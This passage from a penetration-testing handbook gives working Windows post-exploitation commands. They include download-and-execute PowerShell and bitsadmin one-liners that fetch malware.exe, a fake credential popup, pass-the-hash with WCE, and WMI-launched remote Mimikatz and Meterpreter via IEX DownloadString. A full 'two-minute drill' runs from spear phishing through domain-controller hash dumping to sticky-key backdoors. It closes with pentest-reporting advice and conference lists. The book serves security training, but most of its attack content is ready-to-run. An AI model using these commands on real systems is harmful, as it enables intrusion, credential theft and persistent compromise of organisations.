/opt/meterssh/dist/meterssh.exe. Copy this file to your victim host and start the meterssh.exe.
‚óè cd /opt/meterssh/ && python ./monitor.py
‚óè Execute the executable on a victim host
MeterSSH
The binary file we created executed on the victim host, connected back to our server over SSH and
created a local port forward on 8021. Additionally, the binary tunnels a Meterpreter shell through the
SSH tunnel, bypassing any IDS or application-based firewalls.
SSH Tunnel
Powershell
As you can see, PowerShell is an amazing tool to use for any penetration tester.
One of my favorite attacks is the simplest. If you ever end up on a host where you have limited
privileges, which prevents you from using Mimikatz or even dropping executables, you can always
ask a user for their password.
Let‚Äôs say you have a shell on a system (doesn‚Äôt have to be Meterpreter), what if you could push a
popup to prompt the user to type in their credentials? Let‚Äôs demonstrate the power of PowerShell:
‚óè cd /opt/Easy-P
‚óè python ./easy-p
‚óè 7 - Base64 Encode
‚óè 1 - From File
‚óè /opt/PowerShell_Popup/popup.ps1
Base64 Encoded PowerShell Password Popup
The output will be a long, base64 encoded string. Once we execute the command on our victim‚Äôs host,
we should see results similar to those below.
PowerShell Password Popup
The window on the right shows that the victim received a popup that says, ‚ÄúCredentials are
required.‚Äù Once the victim enters their credentials and hits OK, the response is sent back to our
command shell. This is where a little social engineering takes place. In some cases, the user might hit
cancel or close the password prompt without typing in their credentials, but . . . if you run the
command three or four more times, more than likely, the user will get tired of the message and will
end up putting in their password. A benefit of this type of attack is that the victim host did not need to
download anything from the Internet, since you encoded the whole payload and we did not need any
elevated privileges.
Windows 7/8 Uploading Files To The Host
On Windows 7 and 8, a better way to get files on a host is using bitsadmin or PowerShell. Using
bitsadmin is great because it is used for Windows updates and utilizes IE proxy settings. If the
organization has a web proxy that requires AD credentials, this will allow you to get around it.
PowerShell (check the Post Exploitation with PowerSploit section for more details)
‚óè cmd.exe /c "PowerShell (New-Object
System.Net.WebClient).DownloadFile('http://www.securepla.net/malware.exe','
malware.exe');(New-Object -com Shell.Application).ShellExecute('malware.exe')"
Bitsadmin
‚óè cmd.exe /c "bitsadmin /transfer myjob /download /priority high
http://www.securepla.net/malware.exe c:\ malware.exe&start malware.exe"
Pivoting
If you have compromised a host and realize that it is either dual-homed or connected to multiple
networks, your attacks will have to pivot through that compromised host. The following example will
route a port scan through our initial victim host to the segmented network.
Autoroute and Auxiliary Scan
‚óè run autoroute -s 192.168.1.0/24
‚óè run autoroute -p
‚óè background
‚óè use auxiliary/scanner/portscan/tcp
‚óè set RHOSTS 192.168.1.127
‚óè set PORTS 135,139,445
‚óè set THREADS 20
‚óè exploit
Pivoting
Now that we have a pivot set up, we can use additional tools through that same pivot tunnel:
‚óè use auxiliary/scanner/discover/udp_probe
‚óè use exploit/windows/smb/psexec
Socks Proxy
Sometimes you need to run non-metasploit modules through your first victim host. It might be a
vulnerability scanner, nmap, or a particular exploit. Once we have a Meterpreter shell, we can
background that session and add some routes. We want to be able to pivot through this first host and
run nmap in our example.
In our next example, our victim host has an IP of 192.168.2.24, but also has access to the
192.168.1.0/24 range. Since we can‚Äôt access that network directly, we will have to pivot off this box
using proxychains: (52)(53)
‚óè route add 192.168.1.0 255.255.255.0 4
‚óè route print
‚óè use auxiliary/server/socks4a
‚óè run
This enables a listener on our Kali attacker host on port 1080. We now need to modify the default
proxychains configuration to match our Metasploit settings. After that, we can kick off nmap through
our socks4 proxy using the proxychains tool:
‚óè gedit /etc/proxychains.conf
‚óã change ‚Äúsocks4 127.0.0.1 4444‚Äù to ‚Äúsocks4 127.0.0.1 1080‚Äù
‚óè proxychains nmap -sT -P0 -p135,139,445 192.168.1.127
The output should look something like:
‚óè root@kali:~# gedit /etc/proxychains.conf
‚óè root@kali:~# proxychains nmap -sT -P0 -p135,139,445 192.168.1.127
‚óè ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 6.47 ( http://nmap.org ) at 2015-03-21 17:10 EDT
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.127:135-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.127:139-<><>-OK
|S-chain|-<>-127.0.0.1:1080-<><>-192.168.1.127:445-<><>-OK
Nmap scan report for win7-core (192.168.1.127)
Host is up (1.5s latency).
PORT STATE SERVICE
135/tcp open msrpc
139/tcp open netbios-ssn
445/tcp open microsoft-ds
Move Laterally with Hashes
As you might have heard, pass-the-hash is dead‚Ä¶ or is it? A big change that occurred in the last year
is that Microsoft patched the ability to connect to remote systems using accounts that are members of
the localgroup ‚ÄúAdministrators‚Äù. This used to be the easiest method to move laterally when you
grabbed Local Admin passwords from Group Policy Preferences and used PSExec.
There is one exception to this‚Äìthe patch did not affect local default admin accounts with RID 500.
Even if you changed the username for the RID 500 account, it can still be used to move laterally.(54)
(55)
Once you obtain hashes for the RID 500 account or you get onto a network without patched client
systems, you can use the hashes, instead of passwords, to gain Meterpreter shells. As specified
before, we are going to use psexec_psh instead of the standard psexec.
Using Hashes to Pivot
By setting SMBPass to use the hash, we don‚Äôt need to crack any hashes to exploit remote systems.
Moving Laterally with NTLM Hashes
We know if we have other users logged into the system, we can use incognito and impersonate tokens.
(56) What if you had hashes from different systems and wanted to become the remote user on the
current compromised machine?
This is where we can use our manipulated WCE (Windows Credential Editor) binary that we
configured in the Evading AV section and use it to import hashes onto our victim host. For the
example below, we are assuming we already have local admin or system type access. With our
Meterpreter shell, upload your WCE binary to an accessible location:
‚óè upload /opt/wce.exe C:\\users\\public
We can drop into a shell with the ‚Äúshell‚Äù command and list our current hashes on the local machine:
‚óè shell
‚óè cd \users\public
‚óè wce -l
WCE - Importing Hashes
Notice we only have two sets of hashes on this system. From a prior compromise, we were able to
get the hashes of a domain administrator. We need to import these hashes onto our current victim host
with the following command:
‚óè wce.exe -s [hash]
As you can see from the image below, we were successful in importing the hashes for the user ‚Äúlab‚Äù.
WCE - Access Hosts Using Hashes
With the ‚Äúlab‚Äôs‚Äù hashes imported, we can try to access the domain controller‚Äôs C-drive. When trying
to connect to the domain controller (dc) via ‚Äúdir \\dc\c$‚Äù, we get an access denied message. This is
due to the fact that it is not using the ‚Äúlab‚Äù account. We can mount the domain controller‚Äôs C-drive
using the imported credentials with the following command:
‚óè net use * \\dc\c$ /user:hacker\lab
Now, use the cached ‚Äúlab‚Äù account hashes to access the domain controller. The image above shows
that we successfully mounted the domain controller to the Z-drive and we now have the ability to
interact with the DC.
This attack leads to a wealth of additional attacks and is a great complement for smart, lateral
movement.
Moving Laterally with WMI
WMI allows you to remotely execute PowerShell commands. The benefit of this attack is that it will
evade anti-virus as the PowerShell commands all run in memory. In the examples below, we will be
supplying credentials with WMI to execute our commands:
‚óè wmic /USER:"hacker\testuser1" /PASSWORD:"!Asdfasdfasdf1!"
/NODE:172.16.151.201 process call create "powershell.exe -exec bypass IEX (NewObject
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploiMimikatz.ps1'); Invoke-Mimikatz -DumpCreds | Out-File C:\\Users\\public\\a.txt"
‚óè dir \\win8\c$\Users\Public\
‚óè type \\win8\c$\Users\Public\a.txt
‚óè del \\win8\c$\Users\Public\a.txt
In the image below, we are currently on the host win7. We execute a wmic call to remotely execute a
PowerShell script against the host win8. This command will run Mimikatz and dump it out to a file on
our remote host. Once completed, we can read this file from our win7 host.
Moving Laterally with WMI
Moving Laterally Using Services
Another way to move laterally is to move and execute a file on another system to which you have
access. We heavily used PowerShell to download and execute files in prior examples. However, you
might come across that one system that doesn't have PowerShell enabled. In the next command, we
will copy our malware to the remote host‚Äôs public folder:
‚óè copy malware.exe \\[Remote Machine]\C$\users\public
Then, we will create a service called Antivirus, and configure that service to execute our malware:
‚óè sc \\[Remote Machine] create Antivirus binpath= "c:\users\public\malware.exe"
‚óã Make sure to add the space between binpath= and your executable.
Lastly, we can start that service with:
‚óè sc \\[Remote Machine] start Antivirus
Creating Malicious Services
Remember that you will need a privileged account on the remote machine that can create services and
start/stop them.
Proxy Between Hosts
Let's say you are on the network, but you cannot reach to specific subnets because they are only
allowed access by certain user machines or IPs. In these cases, you will have to proxy off a user with
the proper IPs or access.
Windows:
One of the cheap and easy ways to proxy between hosts in segmented networks is to utilize a default
Windows function. Netsh is a command line tool to modify network configurations. The following
command will put the host in listening mode on port 8080 and redirect all requests to 192.168.5.33
over port 3389. This will be an easy way to proxy RDP traffic into other hosts. Remember you will
need elevated privileges to run these commands.
You can either use WMIC to execute remotely or if you already have a shell, then use the following
command:
‚óè netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0
connectport=3389 connectaddress=192.168.5.33
If you want to do it straight through Netsh remotely:
‚óè reg add \\<Remote
IP>\HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v
LocalAccountTokenFilterPolicy /t REG_DWORD /d 1
‚óè sc \\<Remote IP> start remoteregistry
‚óè sc \\<Remote IP> start remoteaccess
‚óè netsh
‚óè set machine <Remote IP>
‚óè interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0
connectport=3389 connectaddress=192.168.5.33
The great part about Netsh port proxy is that it supports IPv4 to Ipv6 proxying. You can now take one
of the compromised hosts and proxy your RDP requests to that segmented network.(57)
Linux:
The old but always faithful proxying through Linux uses Netcat and backpipes. On the victim host
through which you want to proxy, run the following commands below.(58)
‚óè mknod backpipe p
‚óè nc -l -p 8080 0<backpipe | nc 10.0.18.134 3389 | tee backpipe
In the example above, we proxy through the compromised host by connecting to port 8080. This
forwards the connection to an RDP service at IP 10.0.18.134.
Commercial Tools:
So far, I have talked about many open source tools. Now, I want to also mention their commercial
counterparts. This is solely to build awareness of what is available out there as a resource. I amfrequently asked if it is better to go totally open source or commercial products. There is no right or
wrong answer. What is important is that you do not limit yourself to one side or the other, but instead,
find the processes, tools, and techniques that are right for that particular job.
Cobalt Strike:
Cobalt Strike is one of my favorite tools for a multitude of reasons. Cobalt sits on top of the
Metasploit Framework and can attack, pivot, evade AV, establish persistence and, most importantly,
provide custom payloads (such as Beacon). More on Beacon here:
http://www.advancedpentest.com/help-beacon. The main reason I recommend that all pentesters look
into Cobalt Strike is due to the way their C2s communicate over DNS. Networks are starting to
thoroughly regulate what traffic can go out of the network with tools such as Next-Generation
Firewalls. Tools like Cobalt Strike use DNS as a way to use the current network infrastructure in
order to bypass a lot of the network security detection tools.
New Cobalt Strike licenses cost $3,500 per user for a one-year license. License renewals cost
$2,500 per user, per year. You can get a 21-day trial license by going to:
http://www.advancedpentest.com/
A lot of the attacks discussed in this book‚Äìsuch as keyloggers, pivoting, AV evasion‚Äìare incorporated
into Cobalt Strike in an easy-to-use fashion. The best part is that you are able to see your attacks
visually, while having full command line, as you would with msfconsole. It is really the best of both
worlds.
Getting Started with Cobalt Strike:
‚óè http://www.advancedpentest.com/download
‚óè mv cobaltstrike-trial.tgz /opt/
‚óè cd /opt/
‚óè tar zxvf cobaltstrike-trial.tgz
‚óè update-java-alternatives --jre -s java-1.7.0-openjdk-i386
Cobalt Strike
Creating a Windows Executable:
Cobalt Strike - Beacons
‚óè Go to View --> Beacons
‚óè You will see a listing of all available Beacons
‚óè Interact with your currently active Beacon
‚óè Inside the Beacon Command Prompt, type BypassUAC and select the
beacon_payload
Cobalt Strike - BypassUAC
If we go back to the Beacons list, we will see our new Beacon connection with an asterisk (*) next to
it.
Cobalt Strike - New Beacon
If we interact with this Beacon, we can do the normal commands:
‚óè help - get a listing of all the commands
‚óè getsystem - elevate to system
‚óè ps - list processes
‚óè steal_tokens - steal tokens of a Domain Admin User
‚óè spawn shell sessions
‚óè sleep 0 - for dropping into a meterpreter shell
‚óè mode http - for dropping into a meterpreter shell
‚óè meterpreter - drop into a meterpreter session
Cobalt Strike - Compromised Hosts
The real benefit of Beacon is that it is a low and slow attack. You can configure it to do all your
command and control, and exfiltration over DNS with all the functionalities of Metasploit.
Benefits:
‚óè Meterpreter in memory over Beacon
‚óè Beacon is low and slow
‚óè Full communication over DNS - no direct communication to the attacker host
‚óè Beacon uses Cobalt Strike's Artifact Kit to generate an anti-virus safe DLL for
BypassUAC
‚óè Custom Office Files with Payloads (Word/Excel)
‚óè Phishing
‚óè Really easy use with PowerShell
‚óè Creating Executables to Bypass AV
‚óè Team mode
‚óã Connect multiple clients to a single server to share exploited systems
and work together
‚óã http://www.advancedpentest.com/help-setup-collaboration
Without going through all the examples, I highly recommended these videos to watch:
‚óè Deliver DNS Trojan with Microsoft Office Macro:
https://www.youtube.com/watch?feature=player_embedded&v=Ex_bvwMDDbQ
‚óè Cobalt Strike Training: http://www.advancedpentest.com/training
Conclusion:
Cobalt Strike is a must-have for a penetration tester. It heavily utilizes the Metasploit Framework, but
extends it significantly. The penetration game is changing and what used to be smash-and-grab
penetration testing is now about low and slow.
Immunity Canvas
(http://www.immunityinc.com/products/canvas/) (Kali Linux/OS X/Windows)
Immunity's Canvas makes available hundreds of exploits, an automated exploitation system, and a
comprehensive, reliable exploit development framework to penetration testers and security
professionals worldwide.(59)
Similar to Metasploit‚Äôs framework, Canvas is built to be very flexible and is easy to build upon.
Instead of being built on Ruby, as with the Metasploit Framework, Canvas is built on Python. The
GUI is built on top of pyGTK. Canvas‚Äô bread and butter is the fact that it uses MOSDEF. MOSDEF is
a custom C compiler for payload construction. This allows attackers the ability to write additional
code in the memory of the exploited host without having to touch the disk.
Executing Canvas is pretty straightforward and once you have identified a vulnerability, exploiting it
is very much like Metasploit. In the following example, I will build a callback trojan and execute it
on a victim machine.
Canvas
Why get Canvas? Not only for the easy-to-build custom exploits, but for the ease of use in exploiting
vulnerabilities and for the number of default custom exploits. Numerous times I have searched for a
specific exploit on the Security Focus site and find no available public exploits for that vulnerability.
However, browsing through Immunity Canvas‚Äô repository, I will find the exact exploit I need.
No Exploit Found on SecurityFocus
Exploit Available Through Canvas
For me, I use Canvas for the 0-day exploits. Immunity has partnered with:
‚óè Gleg - Agora
‚óè Gleg - SCAD+
‚óè DSquare - D2
‚óè InvetvyDis - VulnDisco
‚óè Enable - VolPPack
These guys provide monthly 0-day exploits for research they are working on. For example, D2
focuses mostly on web 0-day exploits, while VulnDisco focuses mostly on service type
vulnerabilities. For more information, go to:
http://www.immunityinc.com/products/canvas/canvas-exploit-packs-overview.html
Conclusion:
Canvas is a great toolkit to have in your bag. The fact that it uses Python as its core makes it easy for
many penetration testers to build their own modules and exploits. If you are looking for someone else
to do a lot of the 0-day research on third party software, I highly recommend investing in Canvas.
Core Impact
(http://www.coresecurity.com/core-impact-pro)
The last commercial tool I want to discuss is Core Impact. Core is probably one of the most
expensive tools you can have in your offensive testing bag, but it is worth the price. Core Impact
allows for easy automation of exploitation and is said to have 25% more unique Common
Vulnerability Exploits (CVE) versus its competitors.
For those who are really looking for a more automated visual approach, Core Impact is for you. It is
an all-in-one tool to attack web, network, mobile, client and even wireless. Remember the good old
days of auto-pwn? Well, Core has taken this to another level. With a click of a button, it is able to
scan, compromise, take hashes/passwords, persistence and more.
Core Impact
Core Impact is modular like Metasploit, where you can pick and choose exploits to attack victimmachines. The greatest benefit of Core Impact is that it i easy to use. Honestly, going through a
network test is as easy as clicking on: 1) Network Information Gathering, 2) Network Attack and
Penetration, 3) Local Info Gather, and so on. Their exploits are well-tested, actively work on IDS/AV
evasion, and perform most of the local information gathering that you might do on a penetration test. It
takes most of the manual work out of the test.
The example below shows that I have compromised a host and kicked off the Local Information
Gathering module. Core Impact automatically starts pulling local system information and passwords
from common software that store passwords (browsers, Putty, Outlook), runs Mimikatz and more.
Core Impact - Exploitation
Conclusion:
Core Impact not only has a number of well-tested exploits outside the open source platforms, but is
easy to use throughout the whole pentesting cycle, which makes it a powerful tool.
Two-Minute Drill - From Zero To Hero
Since the last book, I thought it would be helpful to include a walkthrough of a full attack. Here‚Äôs the
scenario: You are on Day 5 of your test and you haven‚Äôt been able to exploit the SUCK network. It‚Äôs
time for the two-minute drill. You have two minutes left and you need to go from your ten-yard line
and cover the next 90 yards. This isn‚Äôt the only way or even the best way of doing a penetration test,
but it is one theoretical attack path.
Ten-Yard Line:
First, we need to get email addresses by using Discover and Recon-NG from the Before the Snap
section. This results in a handful of email addresses. Through testing, we have figured out that emails
with an Office extension (docx, pptx, xlsx) do not pass through their mail filter.
Gathering Email Addresses
Twenty-Yard Line:
We then go to The Screen section, and use SET to set up a fake website, which clones their Outlook
Web Application (OWA) external site. Then use the script from /opt/spearphishing/client/spear.py to
send out multiple spoofed emails from IT.
Spear phishing
Afterwards, we obtain a few passwords and validate that we can log into OWA. Now that we on
their internal mail system, we have the ability to skip the Email proxy and send files from one user to
another with Microsoft Excel documents.
Thirty-Yard Line:
Going back to the Special Teams section, create a malicious Excel file using Generate-Macro.ps.
This will place a PowerShell reverse HTTPS Meterpreter script onto the victim host and make a
registry entry to add persistence on reboot.
With that Excel file, we log into the accounts we captured to see with whom they are communicating.
Since we need the user to click the ‚ÄúEnable Macros‚Äù button, we need to find and build a trust
relationship. Therefore, look for someone who has had conversations in the past and make our Excel
files look like the ones they are sending back and forth. In the reply email, make sure you specify that
the recipient opens the Excel file and clicks on the ‚ÄúEnable Macros‚Äù button.
Before they open the email, we need to start up a Meterpreter handler. We kick off Easy-P, and select
PowerShell Meterpreter to create the code for a resource listener file. With a quick msfconsole -r
listener.rc, we now have a full handler running.
Once the victim opens our malicious file, we get a Meterpreter shell!
Meterpreter Shells from Spear phishing
Fifty-Yard Line:
Sadly, we find out we a power user with limited rights. We won‚Äôt be able to dump hashes just yet.
So, we run Powerup from a shell to see if there are any ways to get to system.
Privilege Escalation
Luckily, we find an unquoted service and Write-ServiceEXE issues. We run PowerUp to abuse those
vulnerabilities, create a new user, and restart the service. A quick ‚Äúrunas‚Äù command execution allows
us to kick off another PowerShell Invoke-Shellcode Meterpreter using the Administrative account we
just created. With a quick bypassuac_injection and getsystem on Meterpreter, we are now system!
We jump back to Easy-P and generate a Mimikatz command:
PowerShell - Invoke Mimikatz
When we run the PowerShell Invoke-Mimikatz as system, we can grab the user password frommemory.
Passwords from Memory
Seventy-Yard Line:
Now that we have the user‚Äôs password, let‚Äôs find who the Domain Admins are. From a shell, we
type:
‚óè net group ‚ÄúDomain Admins‚Äù /domain
‚óè C:\Users\testuser1>net group "Domain Admins" /domain
The request will be processed at a domain controller for domain hacker.testlab.
Group name Domain Admins
Comment Designated administrators of the domain
Members
-------------------------------------------------------------------------------
Administrator lab
The command completed successfully.
From the results, we see that ‚Äúlab‚Äù is a domain admin. Let‚Äôs see where he is logged in. From the
Lateral Pass section, we looked at PowerView and the UserHunter functionalities. It queries all of
Active Directory for hosts and sees what users are logged in to each individual host.
‚óè Powershell.exe -NoP -NonI -Exec Bypass IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerToolsInvoke-UserHunter -UserName "lab"
Finding Which Computer the Domain Administrator is on
We know we can‚Äôt log into the Domain Controller, but we do have access to the Win8 host. To move
laterally, we can execute commands on report hosts using WMIC. The payload we want to execute is
a PowerShell Meterpreter on that particular host:
‚óè IEX (New-Object
Net.WebClient).DownloadString('https://raw.githubusercontent.com/cheetz/PowerSploi-Shellcode.ps1'); Invoke-Shellcode -Payload windows/meterpreter/reverse_https -
Lhost 172.16.151.128 -Lport 8080 -Force
I want to reiterate one note, as I see it happen a lot with PowerShell. If you are attacking a Windows
32-bit vs 64-bit system through WMIC, they may require different commands. The first command is
targeting 32-bit systems and the second command below targets 64-bit systems:
‚óè wmic /USER:"hacker\testuser1" /PASSWORD:"!Asdfasdfasdf1!"
/NODE:172.16.151.202 process call create "powershell -EncodedCommand
SQBFAFgAIAAoAE4AZQB3AC0A...AAwACAALQBGAG8AcgBjAGUA"
‚óè wmic /USER:"hacker\testuser1" /PASSWORD:"!Asdfasdfasdf1!"
/NODE:172.16.151.201 process call create
"%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -enc
SQBFAFgAIAAoAE4AZQB3AC0A...AAwACAALQBGAG8AcgBjAGUA"
Remotely Executing PowerShell Using WMI
Eighty-Yard Line:
We now have a Meterpreter Shell on that host and find that we are a local admin on that host. We run
a quick getsystem and will need to pull hashes. We drop back into Easy-P, create a dump hashes
command, and execute:
Generating PowerShell to Dump Hashes
Executing PowerShell ‚Äì Mimikatz
Goal Line:
We have obtained the password for a Domain Administrator. Let‚Äôs use Metasploit and pull the hashes
off of the Domain Controller.
Metasploit has a great module to pull hashes:
‚óè use auxiliary/admin/smb/psexec_ntdsgrab
‚óè Make sure to SET the fields for RHOST, SMBDomain, SMBPass, and SMBUser
‚óè exploit
Dumping the Domain Controller Hashes
If grabbing the NTDS.dit file was successful, Metasploit will drop the file to the /root/.ms4/loot/
folder. Next, convert the dit file to hashes with esedbtool and NTDSextract.
esedbexport command:
‚óè esedbexport -t [Location of Export] [NTDS.dit file]
‚óè /opt/esedbtools/esedbexport -t /tmp/ntds
/root/.msf4/loot/20150214180250_default_172.16.151.200_psexec.ntdsgrab._641158.dRecovering the NTDS.dit
Next, we need to run dshashes.py to convert our tables to password hashes:
‚óè dshashes.py [datatable table] [link_table] --passwordhashes [original bin file from
ntdsgrab]
‚óè python /opt/NTDSXtract/dshashes.py /tmp/ntds.export/datatable.4
/tmp/ntds.export/link_table.7 /tmp/ --passwordhashes
/root/.msf4/loot/20150214180253_default_172.16.151.200_psexec.ntdsgrab._127578.bParsing Hashes
Touchdown! Touchdown! Touchdown!
We have just dumped the whole Active Directory environment! Lastly, we add a little backdoor for
persistence. We quickly run a few registry changes on the Domain Controller and all the hosts in
order to enable the Sticky Key backdoor.
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD \"HKLM\SOFTWARE\Microsoft\Windows
NT\CurrentVersion\Image File Execution Options\sethc.exe\" /v Debugger /t REG_SZ
/d \"C:\windows\system32\cmd.exe\" /f"
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD
\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp\" /v UserAuthentication /t REG_DWORD /d 0 /f"
‚óè wmic /user:[User_Name] /password:[Password] /node:[Server] process call create
"C:\Windows\system32\reg.exe ADD
\"HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDPTcp\" /v SecurityLayer /t REG_DWORD /d 0 /f"
Now, even if they change all their passwords, we still have a system shell on their DCs.
Sticky Key
The crowd goes wild and you pull out your best touchdown dance. With that successful two-minute
drill, you go home complete and ready to write your report.
Post Game Analysis - Reporting
Success! You have finally fully compromised Secure Universal Cyber Kittens, pivoted to sensitive
networks, stolen credentials and documents, and managed to keep backdoors on their servers. Now, it
is time to wrap up the test and write the final report.
The final delivered report is really the only thing that will matter to the client. The report is how you,
the penetration tester, will get paid and be asked to come back. Therefore, this is by far the most
important aspect of your test. You need to be able to explain the findings, rate the vulnerabilities, and
explain how the results will affect the customer in the real world. Regardless of how many hosts you
compromise or how quickly you move laterally through the network, if the client can‚Äôt understand the
end report, reproduce exploitation, and effectively implement remediation, it is not worth its value.
Anyone can run a vulnerability scanner and change the organization name, but not everyone can
understand what the vulnerabilities actually mean.
If you have ever had multiple penetration testers assess your network, you will find that the reports
will vary based on who is performing the test. Some pentesting companies will just re-template a
vulnerability scanner report, while quality pentesting companies will provide a well-detailed report
and include repeatable steps. There is little value in a report that merely states that the client has 100
critical Apache/PHP findings. Real value comes from the fact that the report can confirm whether or
not the findings are valid based on the vulnerability, not just based on the banner version.
Your final report should be influenced by your own presentation style and findings. However, I will
give you some hints and best practices when creating your report.
Some things to think about when writing a report:
‚óè I say this every time: DON‚ÄôT SUBMIT A RE-TITLED Nexpose or Nessus report. I
have seen this happen more than once or twice in my lifetime, where we received a
re-titled report from a consulting company.
‚óè Rate your vulnerabilities
‚óã You should figure out a way to consistently rate your vulnerabilities.
I have built my own matrix that includes references from NIST, DISA,
CVSS, and personal experience to assign ratings to vulnerabilities.
‚óã The matrix includes increasing or decreasing severity based on
internal/external findings, possible availability of exploit code, how
widespread their systems are, what the exploits can lead to, and how it
affects the CIA security triangle.
‚óã Vulnerabilities that go through my matrix will always have the same
criticality level. If a client asks how I scored a rating for a
vulnerability, I can reference my matrix.
‚óã You might have a vulnerability that might be a ‚Äúmedium‚Äù in severity
to the scanner, but what if it is systemic? If it is found not on one host
but on every host, does the overall severity of the issue turn to ‚Äúhigh‚Äù?
‚óè Theoretical vs. Real Findings
‚óã I generally do not like to mark findings as critical if they are only
theoretical and have no actual known exploit available. These should
still be considered findings, but I will generally lower the rating if I
can't find any avenue to exploit the host.
‚óã This gives the client help in properly identifying which findings need
immediate attention versus those that can be applied during a regular
change control window.
‚óè Solutions are just as important as the findings
‚óã If you use a tool to compromise a network, you have to have a
solution to stop it.
‚óã If you don't have a solution, help the client develop a mitigation
strategy.
‚óè Don‚Äôt mis-rate vulnerabilities
‚óã HTTP Flags: As I have said in the prior book, I still see HTTP flags
all the time. A scanner will come back with flags not being enabled,
such as secure flag or missing httpOnly. What if the site doesn‚Äôt even
support any type of client authentication or even provide a user with
any input variables? It is definitely a finding, but it could be
significantly lower than the scanner outputs.
‚óã Cross site scripting can be very dangerous, but having a ‚Äúhigh‚Äù
finding within a forum versus a site that has no users or data to be
inputted to a backend database, should have very different ratings.
‚óã Apache Findings: This is a great example of what I feel distinguishes
good reports from bad reports. Apache findings come up all the time
because they are solely based on banner results. You might see a PHPCGI finding that comes up as critical and report it, but when the client
investigates it, he/she finds that CGI wasn‚Äôt even enabled on the server.
‚óè Make sure vulnerabilities are actual vulnerabilities
‚óã I don't know how many times I have received penetration testing
results telling me my systems had PHP exploits on them. This is
because the scanner, based on version, alerted them of these critical
findings. Some of the findings state that they are PHP CGI issues or
Apache mod security issues. The problem is my servers don't run the
CGI scripts, but the scanner identified the issue just solely based on
versioning. Please make sure that you validate that findings are actual
findings.
‚óè Standardize all your reports by using LaTex templates or something similar.
Again, all these findings should be reported, but having the right severity rating is what is important.
It is critical when writing a penetration test to identify what is realistic versus what is theoretical. I
generally have two parts to a report‚Äìthe first is what can actually be done with known exploits, and
the second is everything else that the scanner picked up.
What you shouldn‚Äôt you do:
http://it.toolbox.com/blogs/securitymonkey/the-worlds-worst-penetration-test-report-byscumbagpentester-58747
What you should have in your report:
‚óè Introduction/Overview
‚óã High-level description of the project, dates, and
company/infrastructure being tested.
‚óè Scope and Objectives
‚óã This section should outline the IP ranges, URLs, and applications that
are to be tested. It should also explain the purpose of the test.
‚óè Deviations from the Statement of Work
‚óã Many tests have changes from the original requirements, such as
having to stop testing on a host, to stop scanning, and/or make changes
to the testing windows.
‚óè Methodology
‚óã A high-level description of the testing process and standards.
‚óè Significant Assessment Findings
‚óã This section should be dedicated to critical findings.
‚óè Positive Observations
‚óã This part is just as important as the significant findings. No one likes
to see a whole report where their company is beat up. Talking about
what the company did well helps lessen the blow on where fixes need
to be made.
‚óè Findings Summary
‚óã Overall view on the findings broken down by severity.
‚óã Conclusion of summary that explains if the environment was found to
be vulnerable for any opportunities for exploitation.
‚óè Detailed Findings
‚óã This should include severity, vulnerability definition, issue/detailed
description/risks, asset, recommendation, snapshots/logs/how to
exploit walkthrough
‚óè Appendix
‚óã Listing of all assets and ports
‚óã Additional information and snapshots
Some examples of reports:
http://isecpartners.github.io/publications/iSEC_Cryptocat_iOS.pdf
https://www.offensive-security.com/reports/penetration-testing-sample-report-2013.pdf
http://www.pentest-standard.org/index.php/Reporting
http://resources.infosecinstitute.com/writing-penetration-testing-reports/
There are times when I generate a second report, based on the client. The second report will be
directed toward higher management and will discuss the systemic issues and patterns of gaps in
security. This shouldn‚Äôt be very detailed or technical, but should mainly state facts at a high-level,
based on the test.
Lastly, if you want to set yourself apart from other pentesters, try to find ways to give yourself added
value that others may not offer. For example, if you are doing a PT for a large company, you can
provide a simple OSINT (Open Source Intelligence) report, in addition to the final report, to describe
what and who can be publicly found from the Internet. There have been times when I created scripts
(Python, PowerShell, Bat) that perform checks against critical findings, so that after they remediate
their systems, they can just execute the script to verify.
Continuing Education
So, you have just finished this book and may have a thirst for more. One of the most important factors
in succeeding in this field is that it takes experience‚Äìnot just learning from books and videos. Start
learning from labs and vulnerable VMs. If you do not currently work for a penetration testing
company, start working on bug bounties. Bug bounties are legal ways to find security bugs on
production sites. Remember to read ALL the fine print before doing any testing.
Bug Bounties:
‚óè https://bugcrowd.com/list-of-bug-bounty-programs
‚óè http://www.bugsheet.com/bug-bounties
Secondly, if you aren‚Äôt involved in the security community, you‚Äôre doing it wrong! It is easy to get
involved. There are a ton of local security groups in every city:
B-sides: http://www.securitybsides.com/w/page/12194156/FrontPage
OWASP: https://www.owasp.org/index.php/OWASP_Chapter
Hacker Spaces: http://hackerspaces.org/wiki/List_of_hackerspaces
Major Security Conferences:
If you are looking for the bleeding-edge research, security conferences are the place to go. It is a great
place to meet like-minded individuals, get your hands dirty, and learn. Two major websites that have
a great list of security conferences are:
‚óè https://secore.info/conferences
‚óè http://infosecevents.net/calendar/
I will give you a small sample of the conferences that I would recommend from personal experience
(in no particular order):
‚óè DefCon (http://www.defcon.org/) - This is one of the largest hacker conferences in
the world and takes place in Las Vegas, NV. This conference is a must and is
relatively affordable.
‚óè DerbyCon (https://www.derbycon.com/) - Another relatively low-cost conference,
which takes place in Kentucky. Some of my favorite talks have come from DerbyCon.
‚óè BlackHat (http://www.blackhat.com/) - This conference is also held in Las Vegas,
NV and is directed more toward corporate employees. It has great speakers, but is
extremely expensive.
‚óè Bsides (http://www.securitybsides.com/) - There are Bsides conferences all over
the country and are usually FREE. Find yours!
‚óè ToorCon (http://toorcon.net/) - This is one of the smaller conferences and is held in
San Diego, CA. You will meet a lot of new people here and everyone is pretty
friendly.
‚óè CanSec (http://cansecwest.com/) - CanSecWest conference is one of the more
technical conferences. Although, extremely pricey, it is best known for its PWN2OWN
contest.
